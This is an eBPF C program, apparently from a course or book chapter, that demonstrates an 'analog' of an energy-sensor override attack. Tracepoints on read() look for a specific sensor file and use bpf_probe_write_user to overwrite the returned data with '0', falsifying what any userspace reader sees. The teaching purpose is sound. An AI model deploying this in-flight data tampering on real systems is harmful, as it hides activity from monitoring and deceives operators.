// ch13 powercap-override ANALOG
// ---------------------------------------------------------------------------
// DISCLAIMER: Intel RAPL / powercap is x86-only. The test kernel here is
// aarch64 linuxkit, so the real subsystem does not exist on this host. This
// analog reproduces the *primitive shape* of the attack on a surface that
// *does* exist: a userspace "sensor daemon" that writes to a plain file, and
// a reader that cats that file. The BPF program uses the same ch05 pattern —
// tracepoints on sys_enter_read / sys_exit_read plus bpf_probe_write_user —
// to rewrite the reader's user buffer in flight.
//
// This is NOT a RAPL exploit. It demonstrates the motion: intercept the
// read syscall, identify the file by basename, rewrite the returned bytes
// before the syscall returns to userspace.
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "GPL";

struct evt {
    unsigned int pid;
    unsigned int tgid;
    char         comm[16];
    long         orig_bytes;
    int          patched;
};

struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 1 << 18);
} events SEC(".maps");

// Per-read state: user buffer pointer + match flag.
struct rctx {
    unsigned long buf;
    unsigned int  is_sensor;
};

struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __type(key, unsigned long);     // pid_tgid
    __type(value, struct rctx);
    __uint(max_entries, 10240);
} inflight SEC(".maps");

// Basename we're watching: "ch13_sensor_energy_uj" (21 chars, fits in 24).
// We compare byte-by-byte to keep the verifier happy on every kernel.
static __always_inline int is_sensor_name(const char *nm)
{
    // 'c','h','1','3','_','s','e','n','s','o','r','_',
    // 'e','n','e','r','g','y','_','u','j','\0'
    return nm[0]=='c' && nm[1]=='h' && nm[2]=='1' && nm[3]=='3' &&
           nm[4]=='_' && nm[5]=='s' && nm[6]=='e' && nm[7]=='n' &&
           nm[8]=='s' && nm[9]=='o' && nm[10]=='r' && nm[11]=='_' &&
           nm[12]=='e' && nm[13]=='n' && nm[14]=='e' && nm[15]=='r' &&
           nm[16]=='g' && nm[17]=='y' && nm[18]=='_' && nm[19]=='u' &&
           nm[20]=='j' && nm[21]==0;
}

SEC("tp/syscalls/sys_enter_read")
int tp_read_enter(struct trace_event_raw_sys_enter *ctx)
{
    unsigned long id   = bpf_get_current_pid_tgid();
    int           fd   = (int)ctx->args[0];
    unsigned long buf  = (unsigned long)ctx->args[1];

    // Walk current->files->fdt->fd[fd] to get the open file, then its
    // dentry->d_name.name. Same CO-RE chain ch05 uses.
    struct task_struct *t = (struct task_struct *)bpf_get_current_task();
    struct files_struct *files = BPF_CORE_READ(t, files);
    if (!files) return 0;
    struct fdtable *fdt = BPF_CORE_READ(files, fdt);
    if (!fdt) return 0;
    unsigned int max_fds = BPF_CORE_READ(fdt, max_fds);
    if ((unsigned int)fd >= max_fds) return 0;
    struct file **farr = BPF_CORE_READ(fdt, fd);
    struct file *f = NULL;
    bpf_probe_read_kernel(&f, sizeof(f), &farr[fd]);
    if (!f) return 0;

    const unsigned char *name = BPF_CORE_READ(f, f_path.dentry, d_name.name);
    char nm[24] = {};
    bpf_probe_read_kernel_str(&nm, sizeof(nm), name);

    struct rctx r = { .buf = buf, .is_sensor = 0 };
    if (is_sensor_name(nm))
        r.is_sensor = 1;

    bpf_map_update_elem(&inflight, &id, &r, BPF_ANY);
    return 0;
}

SEC("tp/syscalls/sys_exit_read")
int tp_read_exit(struct trace_event_raw_sys_exit *ctx)
{
    unsigned long id = bpf_get_current_pid_tgid();
    struct rctx *r = bpf_map_lookup_elem(&inflight, &id);
    if (!r) return 0;

    long ret = ctx->ret;
    int  patched = 0;

    if (ret > 0 && r->is_sensor) {
        // Replace the read() result with "0\n". This mirrors what a real
        // RAPL override would do: make the energy counter look static/zero
        // to any userland observer.
        static const char fake[] = "0\n";
        long n = sizeof(fake) - 1;   // 2 bytes
        if (n > ret) n = ret;
        bpf_probe_write_user((void *)r->buf, fake, n);
        // Best-effort: NUL out a few more bytes so trailing garbage from the
        // real read doesn't trip a naive reader that keeps scanning.
        if (ret > n) {
            static const char zeros[16] = {};
            long tail = ret - n;
            if (tail > (long)sizeof(zeros))
                tail = sizeof(zeros);
            bpf_probe_write_user((void *)(r->buf + n), zeros, tail);
        }
        patched = 1;
    }

    if (r->is_sensor) {
        struct evt *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
        if (e) {
            e->pid        = id & 0xffffffff;
            e->tgid       = id >> 32;
            bpf_get_current_comm(&e->comm, sizeof(e->comm));
            e->orig_bytes = ret;
            e->patched    = patched;
            bpf_ringbuf_submit(e, 0);
        }
    }

    bpf_map_delete_elem(&inflight, &id);
    return 0;
}
